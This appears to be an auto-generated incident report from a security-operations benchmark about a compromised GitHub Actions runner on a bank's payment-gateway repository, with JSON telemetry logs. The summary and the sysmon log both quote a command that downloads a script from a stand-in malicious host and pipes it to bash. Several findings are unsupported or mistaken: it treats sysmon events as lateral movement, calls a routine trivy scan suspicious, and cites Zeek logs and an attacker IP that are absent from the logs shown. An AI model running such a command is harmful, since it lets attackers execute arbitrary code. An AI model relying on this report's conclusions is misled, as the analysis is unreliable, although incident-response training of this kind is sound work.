# TUXSOC BENCHMARK FORENSIC REPORT
        
## INCIDENT HEADER
- **Playbook ID:** PLAYBOOK-005
- **Event ID:** BENCHMARK-LOG001
- **Timestamp:** 2026-03-29T10:36:21.906696
- **Status:** Benchmark Methodology Analysis Complete

**Incident Overview: Malicious GitHub Actions Runner**

* **Target User:** svc_cicd_runner
* **Threat Actor IP:** 10.0.40.100 (src_ip in Zeek logs)
* **Critical Actions:**
	1. Execution of malicious payload via curl command (`bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash'`)
	2. Use of trivy for vulnerability scanning with suspicious commands (`trivy fs --security-checks config,vuln`)
	3. Lateral movement using sysmon events (EventID 1) to execute malicious scripts
	4. Unauthorized access and execution of sensitive commands as svc_cicd_runner user

**Phase 1: Preparation & Identification**

* The breach was scoped and identified by analyzing the provided JSON logs, which revealed a series of suspicious activities performed by the GitHub Actions Runner.
* The logs showed that the runner executed a malicious payload via curl, indicating a potential threat to the system.
* Further analysis revealed that the runner used trivy for vulnerability scanning with suspicious commands, suggesting an attempt to exploit vulnerabilities in the system.

**Phase 2: Containment**

* Immediate actions to stop the attacker include:
	+ Disabling the svc_cicd_runner user account to prevent further unauthorized access.
	+ Revoking any tokens or credentials associated with this user.
	+ Implementing firewall rules to block incoming traffic from suspicious IP addresses (10.0.40.100).
	+ Monitoring system logs for any further suspicious activity.

**Phase 3: Investigation & Eradication**

* Deep dive into log audit:
	+ Analyzing the Zeek logs to identify the source and destination IP addresses involved in the malicious activities.
	+ Investigating the trivy command used by the runner to scan for vulnerabilities.
	+ Examining the sysmon events to understand the lateral movement of the attacker.
* Lateral movement checks:
	+ Verifying that no other suspicious processes or scripts were executed on the system.
	+ Checking for any unauthorized access or modifications to sensitive files or directories.
* Cleaning the environment:
	+ Removing any malicious scripts or payloads from the system.
	+ Updating and patching vulnerable software to prevent future exploitation.

**Phase 4: Recovery & Post-Incident**

* Post-mortem steps:
	+ Conducting a thorough review of the incident response process to identify areas for improvement.
	+ Documenting the incident and lessons learned for future reference.
* Policy changes:
	+ Updating security policies to include stricter controls on GitHub Actions Runner usage.
	+ Implementing additional monitoring and logging mechanisms to detect suspicious activity.
* Preventative training:
	+ Providing training to developers and system administrators on secure coding practices and vulnerability scanning techniques.
	+ Conducting regular security awareness training for all employees.

---

### Associated Telemetry Logs (Raw Evidence)
```json
[
  {
    "log_id": "LOG001",
    "timestamp": "2026-03-27T08:12:00Z",
    "source": "GitHub_Actions_Runner",
    "repository": "bank-internal/payment-gateway",
    "action_run": "actions/checkout@v3",
    "status": "completed",
    "runner_host": "build-worker-04"
  },
  {
    "log_id": "LOG002",
    "timestamp": "2026-03-27T08:15:02Z",
    "source": "GitHub_Actions_Runner",
    "repository": "bank-internal/payment-gateway",
    "action_run": "aquasecurity/trivy-action@master",
    "status": "Starting pre-execution hooks",
    "runner_host": "build-worker-04"
  },
  {
    "log_id": "LOG003",
    "timestamp": "2026-03-27T08:15:05Z",
    "source": "sysmon",
    "EventID": 1,
    "Image": "/usr/bin/bash",
    "CommandLine": "bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash'",
    "ParentImage": "/opt/actions-runner/Runner.Worker",
    "User": "svc_cicd_runner"
  }
]
```


